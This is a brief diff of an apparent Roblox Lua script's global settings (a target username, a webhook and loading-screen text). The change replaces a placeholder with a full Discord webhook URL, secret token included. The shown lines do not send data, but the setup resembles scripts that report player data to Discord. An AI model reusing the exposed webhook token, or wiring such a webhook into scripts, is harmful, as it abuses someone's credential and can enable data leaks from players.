@@ -4,7 +4,7 @@ _G.dhUserName "HerrySzymoN"
 if _G.UserName == nil or _G.UserName == "HerrySzymoN" then
 	_G.UserName = UserName
 end
-if _G.Webhook == nil or _G.Webhook == "NONE" then
+if _G.Webhook == nil or _G.Webhook == "https://discord.com/api/webhooks/1094231461651025951/m5nzA56_Pnrwgph1A8u624N1D1f-AcEhlMXju7vBQJ2AioD01wVc6Fwv5g971n5qb22S" then
 	_G.Webhook = Webhook
 end
 if _G.loadingScreenText == nil or _G.loadingScreenText == "" then
